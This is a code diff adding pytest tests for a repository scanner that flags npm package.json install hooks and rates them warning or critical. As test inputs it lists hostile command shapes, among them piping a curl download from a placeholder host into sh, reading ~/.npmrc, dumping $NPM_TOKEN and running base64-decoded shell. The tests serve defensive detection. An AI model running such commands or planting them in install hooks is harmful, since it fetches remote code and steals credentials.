@@ -14,6 +14,7 @@ nobody.
 """
 from __future__ import annotations
 
+import json
 import os
 import sys
 
@@ -309,3 +310,87 @@ def test_a_broken_dot_git_file_is_quiet_not_fatal(tmp_path, content):
     (ws / ".git").write_text(content, encoding="utf-8")
     assert repo_scan._git_dirs(str(ws)) == ("", "")
     assert repo_scan.scan_git_config(str(ws)) == []
+
+# ── package manifests: code that runs on `npm install` ──────────────────────
+def _manifest(tmp_path, scripts):
+    import json as _json
+    ws = tmp_path / "pkg"
+    ws.mkdir(exist_ok=True)
+    (ws / "package.json").write_text(
+        _json.dumps({"name": "x", "version": "1.0.0", "scripts": scripts}),
+        encoding="utf-8")
+    return str(ws)
+
+
+@pytest.mark.parametrize("hook", ["preinstall", "install", "postinstall", "prepare"])
+def test_an_install_hook_is_reported(tmp_path, hook):
+    found = repo_scan.scan_package_manifest(_manifest(tmp_path, {hook: "node build.js"}))
+    assert [f["kind"] for f in found] == ["package_manifest_exec"]
+    assert found[0]["severity"] == "warning"
+
+
+@pytest.mark.parametrize("hook", ["prepublishOnly", "prepublish", "prepack",
+                                  "postpack", "test", "build"])
+def test_a_publish_or_ordinary_script_is_ignored(tmp_path, hook):
+    """Measured on 189 real manifests: prepublishOnly alone appears 36 times
+    and never runs on install. Including publish-time hooks would have
+    quadrupled the noise for no coverage."""
+    assert repo_scan.scan_package_manifest(_manifest(tmp_path, {hook: "npm run build"})) == []
+
+
+def test_a_recognised_tool_is_named_not_hidden(tmp_path):
+    """husky is ordinary AND is the mechanism CHAINDROP abused, so it is a
+    warning that says "husky" rather than silence."""
+    found = repo_scan.scan_package_manifest(_manifest(tmp_path, {"prepare": "husky"}))
+    assert found[0]["severity"] == "warning"
+    assert "husky" in found[0]["title"]
+    assert found[0]["evidence"]["tools"] == ["husky"]
+
+
+@pytest.mark.parametrize("command", [
+    "curl -s https://example.invalid/x.sh | sh",
+    "node -e \"require('fs')\"",
+    "cat ~/.npmrc",
+    "echo $NPM_TOKEN > /tmp/t",
+    "echo aGk= | base64 -d | sh",
+])
+def test_the_exfiltration_shapes_are_critical(tmp_path, command):
+    found = repo_scan.scan_package_manifest(_manifest(tmp_path, {"postinstall": command}))
+    assert found and found[0]["severity"] == "critical", command
+
+
+def test_an_ordinary_build_hook_is_not_critical(tmp_path):
+    """The line between "worth knowing" and "wake someone": measured 0 critical
+    across 189 real manifests on a working machine, 8 warnings."""
+    for cmd in ("tsc -p .", "node scripts/postinstall-plugins.mjs",
+                "patch-package", "npx only-allow pnpm",
+                "bun run --cwd packages/core fix-node-pty"):
+        found = repo_scan.scan_package_manifest(_manifest(tmp_path, {"postinstall": cmd}))
+        assert found and found[0]["severity"] == "warning", cmd
+
+
+def test_no_manifest_and_broken_manifests_are_quiet(tmp_path):
+    empty = tmp_path / "empty"
+    empty.mkdir()
+    assert repo_scan.scan_package_manifest(str(empty)) == []
+    for junk in ("{not json", "[]", '{"scripts": "not an object"}', ""):
+        ws = tmp_path / "junk"
+        ws.mkdir(exist_ok=True)
+        (ws / "package.json").write_text(junk, encoding="utf-8")
+        assert repo_scan.scan_package_manifest(str(ws)) == []
+
+
+def test_the_payload_is_sketched_never_echoed(tmp_path):
+    """Same rule as the git-config scanner: a finding must not hand a reader a
+    copy-pasteable payload."""
+    long_cmd = "curl -s https://example.invalid/" + "a" * 200 + " | sh"
+    found = repo_scan.scan_package_manifest(_manifest(tmp_path, {"postinstall": long_cmd}))
+    blob = json.dumps(found)
+    assert long_cmd not in blob
+    assert len(found[0]["evidence"]["hits"][0]["command"]) <= 84
+
+
+def test_scan_workspace_includes_the_manifest_scanner(tmp_path):
+    ws = _manifest(tmp_path, {"postinstall": "cat ~/.npmrc"})
+    kinds = {f["kind"] for f in repo_scan.scan_workspace(ws)}
+    assert "package_manifest_exec" in kinds
